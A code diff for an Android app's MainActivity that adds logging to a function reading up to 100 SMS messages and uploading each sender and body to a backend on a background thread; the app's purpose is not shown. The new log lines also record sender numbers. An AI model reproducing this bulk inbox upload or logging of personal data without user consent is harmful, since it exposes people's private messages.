@@ -1032,7 +1032,11 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun syncSmsHistory() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            android.util.Log.w("MainActivity", "READ_SMS permission not granted, skipping inbox sync")
+            return
+        }
+        android.util.Log.d("MainActivity", "Starting SMS inbox sync to backend...")
         Thread {
             runCatching {
                 val cursor: Cursor? = contentResolver.query(
@@ -1046,15 +1050,24 @@ class MainActivity : AppCompatActivity() {
                     var count = 0
                     val addressIndex = it.getColumnIndex("address")
                     val bodyIndex = it.getColumnIndex("body")
+                    android.util.Log.d("MainActivity", "SMS cursor has ${it.count} messages")
                     while (it.moveToNext() && count < 100) {
                         val sender = if (addressIndex != -1) it.getString(addressIndex) else "Unknown"
                         val message = if (bodyIndex != -1) it.getString(bodyIndex) else ""
                         if (sender != null && message != null) {
-                            SmsSyncClient.sync(sender, message)
+                            try {
+                                val code = SmsSyncClient.sync(sender, message)
+                                android.util.Log.d("MainActivity", "Synced SMS #${count + 1} from $sender, response: $code")
+                            } catch (e: Exception) {
+                                android.util.Log.e("MainActivity", "Failed to sync SMS #${count + 1} from $sender: ${e.message}")
+                            }
                         }
                         count++
                     }
-                }
+                    android.util.Log.d("MainActivity", "SMS inbox sync complete. Synced $count messages.")
+                } ?: android.util.Log.w("MainActivity", "SMS cursor was null")
+            }.onFailure { e ->
+                android.util.Log.e("MainActivity", "SMS inbox sync error: ${e.message}", e)
             }
         }.start()
     }
